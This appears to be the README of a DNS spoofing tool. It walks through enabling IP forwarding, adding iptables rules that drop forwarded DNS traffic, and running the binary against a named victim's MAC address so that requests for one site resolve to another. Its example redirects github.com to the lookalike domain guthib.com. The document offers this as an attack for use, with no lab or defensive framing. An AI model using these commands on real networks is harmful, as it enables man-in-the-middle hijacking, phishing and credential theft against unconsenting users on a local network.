# DNS Spoofer

## How to run

### 1. Enable ip forwarding

```sh
echo "1" > /proc/sys/net/ipv4/ip_forward
```

### 2. Add routing via iptables

These commands will make that all packets are passed to the router except for DNS requests.

```sh
sudo iptables -t filter -A FORWARD -p udp --dport 53 -j DROP
sudo iptables -t nat -A POSTROUTING -o wlo1 -p udp --sport 53 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE
```

### 3. Compile

```sh
make
```

### 4. Run

```sh
sudo ./dns_spoofer INTERFACE_NAME GATEWAY_IP_ADDR WEBSITE_ADDR REDIRECT_IP_ADDR VICTIMS_MAC
```

If you are not sure which interface to use, run "ip a" and look for the one that has "state UP".
To get victim's mac address, run "arp-scan --localnet".

#### Example:

If your interface is wlo1, your gateway is 192.168.0.1 and victim's MAC is a8:44:12:13:g2:1b then you can run the following command:

```sh
sudo ./dns_spoofer wlo1 192.168.0.1 github.com guthib.com a8:44:12:13:g2:1b
```

This will make it so that all DNS requests asking for github.com will instead ask for ip addres of guthib.com.
